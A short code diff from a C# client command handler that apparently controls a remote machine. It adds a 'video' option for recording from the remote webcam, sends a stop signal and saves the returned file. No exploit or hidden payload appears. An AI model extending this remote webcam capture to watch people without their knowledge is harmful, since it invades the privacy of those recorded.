@@ -38,6 +38,13 @@ namespace Client.Commands
                 return;
             }
 
+            if (args[0] == "video")
+            {
+                Console.Write("Press [ENTER] to stop the recording... ");
+                Console.ReadLine();
+                ClientCommandsManager.networkManager.WriteLine("STOP");
+            }
+
             // Get data length
             var dataLength = long.Parse(ClientCommandsManager.networkManager.ReadLine());
 
@@ -48,7 +55,7 @@ namespace Client.Commands
                     ClientCommandsManager.networkManager.NetworkStreamToStream(fs, dataLength);
                 }
 
-                ColorTools.WriteCommandSuccess($"Screenshot saved : {fileName}");
+                ColorTools.WriteCommandSuccess($"{(args[0] == "video" ? "Video" : "Webcam shot")} saved : {fileName}");
             }
             catch (Exception)
             {
